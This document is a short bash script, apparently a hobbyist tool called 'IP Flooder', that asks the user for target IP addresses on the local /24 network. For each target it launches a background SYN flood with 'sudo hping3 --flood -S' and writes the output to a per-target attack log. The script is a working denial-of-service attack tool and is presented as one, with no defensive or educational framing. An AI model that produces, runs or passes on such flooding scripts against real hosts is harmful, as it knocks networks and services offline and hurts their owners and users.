#!/bin/bash

clear
echo -e "\n\n\n\n"

echo -e "\t\t\t\t\t   _____ _____    ______ _                 _           "
sleep 0.5
echo -e "\t\t\t\t\t  |_   _|  __ \  |  ____| |               | |          "
sleep 0.5
echo -e "\t\t\t\t\t    | | | |__) | | |__  | | ___   ___   __| | ___ _ __ "
sleep 0.5
echo -e "\t\t\t\t\t    | | |  ___/  |  __| | |/ _ \ / _ \ / _\` |/ _ \ '__|"
sleep 0.5
echo -e "\t\t\t\t\t   _| |_| |      | |    | | (_) | (_) | (_| |  __/ |   "
sleep 0.5
echo -e "\t\t\t\t\t  |_____|_|      |_|    |_|\___/ \___/ \__,_|\___|_|   "
sleep 0.5

echo -e "\n\n"

# Function to get the local network and subnet
get_local_network_info() {
    local_ip=$(ip -4 addr show scope global | grep inet | awk '{print $2}')
    subnet="${local_ip%.*}.0/24"  # Assuming a /24 subnet
    echo "$subnet"
}

# Getting the local network information
network_info=$(get_local_network_info)
echo "Local network info: $network_info"

# Prompt the user to enter target hosts
echo "Enter target hosts separated by spaces:"
read -a IPs

pids=()  # Array(pids) to hold PIDs of background processes

for IP in "${IPs[@]}"
do
    ip_to_check=$IP

    # Check if the IP is within the local network
    if ipcalc -n $network_info | grep -q "${ip_to_check%.*}.0"; then
        log_file="${IP}_attack.log"
        echo "Starting attack on $IP. Logging to $log_file."
        
        echo "Sending SYN packets to $IP from $network_info"
        sudo hping3 -V --flood -S "$IP" &> "$log_file" &
        pids+=($!)  # Capture the PID of the background process
        echo "Attack on $IP initiated. Check $log_file for details."
    else
        echo "$ip_to_check is NOT in the local network."
    fi
done

# Wait for all background processes to finish
for pid in "${pids[@]}"
do
    wait "$pid"
done

echo -e "\n\n All attacks completed!"
